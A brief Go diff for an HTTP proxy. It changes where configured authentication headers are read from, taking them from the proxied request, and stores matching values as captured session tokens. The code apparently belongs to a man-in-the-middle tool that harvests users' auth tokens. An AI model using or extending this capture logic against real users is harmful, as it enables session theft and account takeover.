@@ -1024,7 +1024,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					for k, v := range pl.httpAuthTokens {
 						if _, ok := s.HttpTokens[k]; !ok {
 							if req_hostname == v.domain && v.path.MatchString(resp.Request.URL.Path) {
-								hv := resp.Header.Get(v.header)
+								hv := resp.Request.Header.Get(v.header)
 								if hv != "" {
 									s.HttpTokens[k] = hv
 								}
